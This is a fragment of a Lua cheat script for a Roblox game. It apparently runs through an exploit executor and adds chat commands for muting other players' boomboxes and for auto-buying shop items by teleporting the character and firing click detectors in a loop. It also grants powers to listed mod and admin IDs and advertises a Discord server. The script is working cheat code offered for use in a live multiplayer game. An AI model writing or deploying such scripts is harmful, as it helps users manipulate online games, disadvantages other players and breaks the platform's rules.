                        print('muted ' .. v.Name)
                    end
                end
            else
                local plrtoview = arguments[2]
                if plrtoview then
                    local ptv = findPlayer(plrtoview)
                    if ptv then  
                        if not table.find(muted, ptv.Name) then
                            table.insert(muted, ptv.Name)
                            print('manualy muted ' .. ptv.Name)
                        end
                    end
                end
            end
        end
        
        coroutine.resume(coroutine.create(function()
            local function mute()
                for i,v in pairs(Players:GetChildren()) do
                    if table.find(muted, v.Name) then
                        if v.Character then
                            if v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND') and v.Character.UpperTorso:FindFirstChild('OriginalSize') then
                                v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND'):Stop()
                            end
                        end
                    end
                end
            end
            while wait(.2) do
                local success,err = pcall(mute)
            end
        end))
        
        if CMD == 'unmute' then
            if tostring(arguments[2]) == 'all' then
                muteingnew = false
                for _,v in pairs(Players:GetChildren()) do
                    if table.find(muted, v.Name) then
                        local removemute = table.find(muted, v.Name)
                        table.remove(muted, removemute)
                        print('unmuteed ' .. v.Name)
                    end
                end
            else
                local plrtoview = arguments[2]
                if plrtoview then
                    local ptv = findPlayer(plrtoview)
                    if ptv then  
                        if table.find(muted, ptv.Name) then
                            local removemute = table.find(muted, ptv.Name)
                            table.remove(muted, removemute)
                            print('unmuteed ' .. ptv.Name)
                        end
                    end
                end
            end
        end

        if CMD == 'buy' then
            local itemtobuy = nil
            local itemtobuyammofor = nil
            local ammomodel = nil
            local oldpos = player.Character.HumanoidRootPart.CFrame
            local Cash = player.DataFolder.Currency.Value
            for i,v in pairs(game:GetService('Workspace').Ignored.Shop:GetChildren()) do
                if itemtobuy == nil then
                    if string.find(string.lower(v.Name), arguments[2]) and not string.find(v.Name, 'Ammo') and itemtobuy == nil then
                        if arguments[2] == 'shotgun' then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]
                        elseif arguments[2] == 'tacshotgun' or arguments[2] == 'tacticalshotgun' then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[TacticalShotgun] - $1750"]
                        elseif arguments[2] == 'key' then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Key] - $125"]
                        else
                            itemtobuy = v
                        end
                    end
                    if itemtobuy then
                        if string.find(itemtobuy.Name, 'Mask') then
                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Surgeon Mask] - $25"]
                        end
                        local pricesplit = string.split(itemtobuy.Name, '$')
                        local itemnamesplit = string.split(itemtobuy.Name, '-')
                        local price = tonumber(pricesplit[2])
                        local name = string.gsub(tostring(itemnamesplit[1]), " ", "")
                        print(name)
                        local function buygun()
                            wait()
                            Cash = player.DataFolder.Currency.Value
                            player.Character.HumanoidRootPart.CFrame = itemtobuy.Head.CFrame
                            fireclickdetector(itemtobuy.ClickDetector)
                        end
                        if name == '[MoneyGun]' then
                            repeat buygun() until player.Backpack:FindFirstChild('[Money Gun]') or Cash < price
                        elseif name == '[Double' then
                            repeat buygun() until player.Backpack:FindFirstChild('[Double-Barrel SG]') or Cash < price
                        elseif name == '[SurgeonMask]' then
                            repeat buygun() until player.Backpack:FindFirstChild('[Surgeon Mask]') or Cash < price
                        elseif name ~= '[MediumArmor]' then
                            repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price
                        else
                            repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price or player.Character.BodyEffects.Armor.Value == 100
                        end
                        player.Character.HumanoidRootPart.CFrame = oldpos
                    end
                end
            end
        end
    end
player.Chatted:Connect(function(message,recipient)
    message = string.lower(message)
    local splitString = message:split(" ") -- Will Split String when space
    local slashCommand = splitString[1] 
    local cmd = slashCommand:split(prefix)	
    local cmdName = cmd[2]	
    if commands[cmdName] then
    	local arguments = {} 
    	for i = 2, #splitString, 1 do
    	   table.insert(arguments,splitString[i])			
    	end
    commands[cmdName](arguments)
    end
end)


------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

wait(5)
if ModCheck[player.UserId] then
    IsMod = true
    DisableMod = true
    announce('Granted Mod Powers', 'you are immune to mod powers | type /e noshield or /e shield to toggle', 10)
elseif table.find(swagmins, player.UserId) then
    announce('Granted Admin Powers', 'hi :3', 10)
    IsMod = false
    DisableMod = false
else
    IsMod = false
    DisableMod = false
    announce('Commands Loaded', 'join discord.gg/swagmode for a list of commands', 10)
end
end)
if err then print(err) end